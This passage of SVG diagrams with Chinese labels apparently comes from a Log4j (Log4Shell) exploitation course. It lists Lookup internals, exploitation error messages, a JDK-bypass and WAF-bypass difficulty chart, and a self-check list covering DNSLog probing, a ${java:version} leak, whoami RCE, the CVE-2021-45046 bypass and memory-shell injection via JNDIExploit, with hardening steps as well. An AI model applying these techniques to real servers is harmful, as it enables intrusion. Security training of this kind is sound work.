  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Appender: 日志输出位置 Console/File/JDBC</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Layout: 日志格式 PatternLayout/jsonTemplate</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Lookup: 变量替换 ${} 解析器(核心漏洞点)</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">StrSubstitutor: ${} 实际执行替换</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g6wnludon" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g6wnludon)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚠️ 常见报错与排查</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">javax.naming.CommunicationException → 目标内网不出网 或防火墙拦截</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">javax.naming.NamingException → LDAP服务未启动 端口错</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ClassNotFoundException → 远程class路径错</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">NoClassDefFoundError: org/apache/logging/log4j → 版本不匹配</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">BadAttributeValueExpException → 反序列化链不兼容</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="ghxdmyqki" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#ghxdmyqki)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎓 难度进度条</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">基础检测DNS探测 ████████░ 80%</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">出网JNDI远程RCE ███████░░ 70%</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK8u191+ TomcatEL绕过 █████░░░░ 50%</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">不出网信息泄露全收集 ████████░ 80%</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">WAF绕过8大变形 ██████░░░░ 60%</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加固7件套落地验证 ████████░ 80%</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gumcj1vgp" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gumcj1vgp)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ Day42 通关自测CheckList</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">DNSLog盲探 成功在dnslog.cn接收到请求</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${java:version} 成功泄露JDK版本</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">出网场景 成功RCE执行whoami并回显</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2021-45046 二次绕过 成功在2.15.0命中</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDIExploit 内存马成功注入</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加固后 所有Payload全部失效验证</text>
</svg>
